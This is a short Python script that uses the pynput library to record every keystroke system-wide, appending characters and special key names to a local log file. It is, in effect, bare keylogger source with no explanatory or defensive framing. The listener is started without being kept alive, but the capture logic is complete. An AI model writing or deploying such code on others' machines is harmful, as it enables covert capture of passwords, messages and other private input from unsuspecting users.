from pynput import keyboard

def on_press(key):
  try:
    with open("logs/keystrokes.txt", "a") as log_file:
      log_file.write(f"{key.char}")
       
  except AttributeError:
    with open("logs/keystrokes.txt", "a") as log_file:
      log_file.write(f" [{key}] ")
 
listener = keyboard.Listener(on_press=on_press)
listener.start()